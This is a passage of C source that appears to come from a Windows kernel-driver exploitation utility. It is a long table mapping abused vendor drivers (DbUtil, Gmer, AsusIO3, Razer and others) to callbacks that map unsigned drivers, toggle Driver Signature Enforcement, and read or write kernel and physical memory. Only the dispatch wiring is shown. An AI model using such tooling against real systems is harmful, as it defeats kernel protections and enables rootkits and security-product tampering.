        (provWriteKernelVM)WRZeroWriteKernelVirtualMemory,

        (provVirtualToPhysical)WRZeroVirtualToPhysical,
        (provQueryPML4)WRZeroQueryPML4Value,
        (provReadPhysicalMemory)WRZeroReadPhysicalMemory,
        (provWritePhysicalMemory)WRZeroWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)PhyMemReadKernelVirtualMemory,
        (provWriteKernelVM)PhyMemWriteKernelVirtualMemory,

        (provVirtualToPhysical)PhyMemVirtualToPhysical,
        (provQueryPML4)PhyMemQueryPML4Value,
        (provReadPhysicalMemory)PhyMemReadPhysicalMemory,
        (provWritePhysicalMemory)PhyMemWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)WinIoUnregisterDriver,
        (provPreOpenDriver)WinIoPreOpen,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)LHAReadKernelVirtualMemory,
        (provWriteKernelVM)LHAWriteKernelVirtualMemory,

        (provVirtualToPhysical)LHAVirtualToPhysical,
        (provQueryPML4)LHAQueryPML4Value,
        (provReadPhysicalMemory)LHAReadPhysicalMemory,
        (provWritePhysicalMemory)LHAWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)DI64ReadKernelVirtualMemory,
        (provWriteKernelVM)DI64WriteKernelVirtualMemory,

        (provVirtualToPhysical)DI64VirtualToPhysical,
        (provQueryPML4)DI64QueryPML4Value,
        (provReadPhysicalMemory)DI64ReadPhysicalMemory,
        (provWritePhysicalMemory)DI64WritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)GmerRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)GmerReadVirtualMemory,
        (provWriteKernelVM)GmerWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)DbUtilReadVirtualMemory,
        (provWriteKernelVM)DbUtilWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)MimidrvReadVirtualMemory,
        (provWriteKernelVM)MimidrvWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)KphRegisterDriver,
        (provUnregisterDriver)KphUnregisterDriver,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)KphReadKernelVirtualMemory,
        (provWriteKernelVM)KphWriteKernelVirtualMemory,

        (provVirtualToPhysical)KphVirtualToPhysical,
        (provQueryPML4)KphQueryPML4Value,
        (provReadPhysicalMemory)KphReadPhysicalMemory,
        (provWritePhysicalMemory)KphWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)KphOpenProcess
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)PexRegisterDriver,
        (provUnregisterDriver)PexpUnregisterDriver,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)PexReadKernelVirtualMemory,
        (provWriteKernelVM)PexWriteKernelVirtualMemory,

        (provVirtualToPhysical)PexVirtualToPhysical,
        (provQueryPML4)PexQueryPML4Value,
        (provReadPhysicalMemory)PexReadPhysicalMemory,
        (provWritePhysicalMemory)PexWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)PexOpenProcess
    },

    {
        NULL,

        (provStartVulnerableDriver)DbUtilStartVulnerableDriver,
        (provStopVulnerableDriver)DbUtilStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)DbUtilReadVirtualMemory,
        (provWriteKernelVM)DbUtilWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)DbkStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)DbkMapDriver,
        (provControlDSE)DbkControlDSE,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)DbkOpenProcess
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)AsusIO3UnregisterDriver,
        (provPreOpenDriver)AsusIO3PreOpen,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)HwReadKernelVirtualMemory,
        (provWriteKernelVM)HwWriteKernelVirtualMemory,

        (provVirtualToPhysical)HwVirtualToPhysical,
        (provQueryPML4)HwQueryPML4Value,
        (provReadPhysicalMemory)HwReadPhysicalMemory,
        (provWritePhysicalMemory)HwWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)MapMemRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)MapMemReadKernelVirtualMemory,
        (provWriteKernelVM)MapMemWriteKernelVirtualMemory,

        (provVirtualToPhysical)MapMemVirtualToPhysical,
        (provQueryPML4)MapMemQueryPML4Value,
        (provReadPhysicalMemory)MapMemReadPhysicalMemory,
        (provWritePhysicalMemory)MapMemWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)ZmRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)ZmMapDriver,
        (provControlDSE)ZmControlDSE,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)ZmOpenProcess
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)DI64ReadKernelVirtualMemory,
        (provWriteKernelVM)DI64WriteKernelVirtualMemory,

        (provVirtualToPhysical)DI64VirtualToPhysical,
        (provQueryPML4)DI64QueryPML4Value,
        (provReadPhysicalMemory)DI64ReadPhysicalMemory,
        (provWritePhysicalMemory)DI64WritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)AsrReadPhysicalMemory,
        (provWritePhysicalMemory)AsrWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)AlcReadPhysicalMemory,
        (provWritePhysicalMemory)AlcWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)RmReadPhysicalMemory,
        (provWritePhysicalMemory)RmWritePhysicalMemory,

        (provValidatePrerequisites)RmValidatePrerequisites,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)PhmRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)PhmReadPhysicalMemory,
        (provWritePhysicalMemory)PhmWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)LddRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)LddControlDSE,

        (provReadKernelVM)LddReadKernelVirtualMemory,
        (provWriteKernelVM)LddWriteKernelVirtualMemory,

        (provVirtualToPhysical)LddpVirtualToPhysical,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)LddReadWritePhysicalMemoryStub,
        (provWritePhysicalMemory)LddReadWritePhysicalMemoryStub,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)DellRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)DpdReadPhysicalMemory,
        (provWritePhysicalMemory)DpdWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)HpEtdReadVirtualMemory,
        (provWriteKernelVM)HpEtdWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)KObExpReadVirtualMemory,
        (provWriteKernelVM)KObExpWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)ZdcStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)ZdcRegisterDriver,
        (provUnregisterDriver)ZdcUnregisterDriver,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)ZdcReadKernelVirtualMemory,
        (provWriteKernelVM)ZdcWriteKernelVirtualMemory,

        (provVirtualToPhysical)ZdcVirtualToPhysical,
        (provQueryPML4)ZdcQueryPML4Value,
        (provReadPhysicalMemory)ZdcReadPhysicalMemory,
        (provWritePhysicalMemory)ZdcWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)ZdcStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)ZdcRegisterDriver,
        (provUnregisterDriver)ZdcUnregisterDriver,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)ZdcReadKernelVirtualMemory,
        (provWriteKernelVM)ZdcWriteKernelVirtualMemory,

        (provVirtualToPhysical)ZdcVirtualToPhysical,
        (provQueryPML4)ZdcQueryPML4Value,
        (provReadPhysicalMemory)ZdcReadPhysicalMemory,
        (provWritePhysicalMemory)ZdcWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)EchoDrvRegisterDriver,
        (provUnregisterDriver)EchoDrvUnregisterDriver,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)EchoDrvReadVirtualMemory,
        (provWriteKernelVM)EchoDrvWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)EchoDrvOpenProcess
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NvoReadPhysicalMemory,
        (provWritePhysicalMemory)NvoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)NULL,
        (provControlDSE)NULL,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)BeDrvOpenProcess
     },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)WRZeroReadPhysicalMemory,
        (provWritePhysicalMemory)WRZeroWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },


    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)NULL,
        (provMapDriver)NULL,
        (provControlDSE)NULL,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)RazerOpenProcess
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)PdFwReadVirtualMemory,
        (provWriteKernelVM)PdFwWriteVirtualMemory,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)NULL,
        (provWritePhysicalMemory)NULL,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)RmReadPhysicalMemory,
        (provWritePhysicalMemory)RmWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)WinIoRegisterDriver,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE,

        (provReadKernelVM)WinIoReadKernelVirtualMemory,
        (provWriteKernelVM)WinIoWriteKernelVirtualMemory,

        (provVirtualToPhysical)WinIoVirtualToPhysical,
        (provQueryPML4)WinIoQueryPML4Value,
        (provReadPhysicalMemory)WinIoReadPhysicalMemory,
        (provWritePhysicalMemory)WinIoWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)NULL,
        (provUnregisterDriver)NULL,
        (provPreOpenDriver)NULL,
        (provPostOpenDriver)KDUProviderPostOpen,
        (provMapDriver)KDUMapDriver,
        (provControlDSE)KDUControlDSE2,

        (provReadKernelVM)NULL,
        (provWriteKernelVM)NULL,

        (provVirtualToPhysical)NULL,
        (provQueryPML4)NULL,
        (provReadPhysicalMemory)EvgaReadPhysicalMemory,
        (provWritePhysicalMemory)EvgaWritePhysicalMemory,

        (provValidatePrerequisites)NULL,

        (provOpenProcess)NULL
    },

    {
        NULL,

        (provStartVulnerableDriver)KDUProvStartVulnerableDriver,
        (provStopVulnerableDriver)KDUProvStopVulnerableDriver,

        (provRegisterDriver)AsrRegisterDriver,
        (provUnregisterDriver)NULL,
